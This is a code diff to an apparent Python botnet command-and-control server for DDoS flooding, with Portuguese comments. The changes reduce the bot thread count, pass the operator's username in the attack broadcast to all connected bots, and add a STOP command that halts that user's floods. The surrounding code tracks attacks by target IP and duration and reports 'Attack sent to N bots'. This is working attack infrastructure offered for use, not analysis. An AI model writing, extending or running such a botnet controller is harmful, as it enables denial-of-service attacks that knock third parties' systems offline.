@@ -20,7 +20,7 @@ maxAttacks=30
 rootUser='root'
 
 # Não aumente de mais as threads (Você pode foder com seus bots)
-threads=32
+threads=5
 
 ansi_clear = '\033[2J\033[H'
 
@@ -231,11 +231,14 @@ def send(socket, data, escape=True, reset=True):
         data += '\r\n'
     socket.send(data.encode())
 
-def broadcast(data):
+def broadcast(data, user):
     dead_bots = []
     for bot in bots.keys():
         try:
-            send(bot, f'{data} {threads}', False, False)
+            if len(data) > 5:
+                send(bot, f'{data} {threads} {user}', False, False)
+            else:
+                send(bot, f'{data} {user}', False, False)
         except:
             dead_bots.append(bot)
     for bot in dead_bots:
@@ -296,6 +299,7 @@ def command_line(client, username):
                 send(client, f'{C}HELP{gray}                Shows list of commands')
                 send(client, f'{C}BOTNET{gray}              Shows list of botnet attack methods')
                 send(client, f'{C}BOTS{gray}                Shows all conected bots')
+                send(client, f'{C}STOP{gray}                Stop all your floods in progress')
                 send(client, f'{C}CLEAR{gray}               Clears the screen')
                 send(client, f'{C}LOGOUT{gray}              Disconnects from C&C server\n')
 
@@ -320,6 +324,14 @@ def command_line(client, username):
             elif command == '!USER' or command == '!U':
                 if username == rootUser:
                     users(args, send, client)
+
+            elif command == 'STOP':
+                if username in attacks:
+                    del attacks[username]
+                    broadcast(data, username)
+                    send(client, f'\n{gray}> {C}Your flooding has been successfully stopped.\n')
+                else:
+                    send(client, f'\n{gray}> {C}You have no floods in progress.\n')
 
             elif command == '!BL' or command == '!BLACKLIST' or command == '!B':
                 if username == rootUser:
@@ -364,7 +376,7 @@ def command_line(client, username):
                                                 for x in attackSend.split('\n'):
                                                     send(client, '\x1b[3;31;40m'+ x)
 
-                                                broadcast(data)
+                                                broadcast(data, username)
                                                 send(client, f'{G} Attack sent to {len(bots)} bots\n')
                                                 attacks.update({username: {'target': ip, 'duration': secs}})
                                                 threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
